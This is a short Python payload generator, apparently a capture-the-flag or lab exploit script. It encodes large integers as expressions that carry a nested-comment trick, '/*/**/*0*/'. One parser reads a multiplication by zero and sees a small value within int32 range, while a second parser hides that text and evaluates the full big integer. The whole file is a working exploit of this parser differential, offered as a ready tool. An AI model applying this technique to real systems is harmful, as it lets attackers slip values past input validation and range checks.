BASE = 2147483648
MAGIC = "/*/**/*0*/"  # parser1 sees *0, parser2 hides it (nested comments)

def encode_bigint(n: int) -> str:
    """Return expression string that parser2 evaluates to n, parser1 stays within int32.

    Uses Horner form in base BASE with MAGIC inserted before each *BASE, so parser1
    multiplies by 0 while parser2 ignores the *0 (nested comment), keeping parser1's
    result at the last digit (< BASE).
    """
    neg = n < 0
    n_abs = -n if neg else n
    if n_abs == 0:
        digits = [0]
    else:
        digits = []
        while n_abs:
            digits.append(n_abs % BASE)
            n_abs //= BASE
        digits.reverse()

    expr = str(digits[0])
    for d in digits[1:]:
        expr = f"({expr}{MAGIC}*{BASE}+{d})"

    if neg:
        expr = f"-({expr})"
    return expr

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("usage: python payload_gen.py <integer>")
        sys.exit(1)
    try:
        value = int(sys.argv[1], 0)
    except ValueError:
        print("invalid integer")
        sys.exit(1)
    print(encode_bigint(value))
